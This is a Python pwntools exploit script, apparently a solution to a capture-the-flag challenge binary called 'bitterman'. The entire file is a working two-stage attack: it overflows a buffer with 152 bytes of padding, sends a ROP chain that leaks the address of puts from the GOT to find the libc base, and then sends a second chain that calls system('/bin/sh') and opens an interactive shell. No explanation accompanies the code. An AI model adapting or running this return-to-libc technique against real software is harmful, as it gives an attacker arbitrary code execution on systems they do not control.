#!/usr/bin/env python
from pwn import *

# context(terminal=['bash', 'new-window'])

# p = gdb.debug('./bitterman', 'b main')
p = process('./bitterman')

context(os='linux', arch='amd64')
# context.log_level = 'debug'

bitterman = ELF('./bitterman')
rop = ROP(bitterman)
libc = ELF('libc.so.6')

junk = "A"*152
rop.search(regs=['rdi'], order='regs')
rop.puts(bitterman.got['puts'])
rop.call(bitterman.symbols['main'])
log.info('Stage 1: ROP chain:\n' + rop.dump())


payload = junk + str(rop)


p.recvuntil("> What's your name?")
p.sendline("Positivity")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)
p.recvuntil('Thanks!\n')
leaked_puts = p.recvline().rstrip().ljust(8, "\x00")
# To "unpack" it
leaked_puts = u64(leaked_puts)
log.success(leaked_puts)

# Stage 2
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 rop chain:\n"+rop2.dump())

payload = junk + str(rop2)

p.recvuntil("> What's your name?")
p.sendline("Positivity")
p.recvuntil("> Please input the length of your message:")
p.sendline("1024")
p.recvuntil("> Please enter your text:")
p.sendline(payload)

p.interactive()
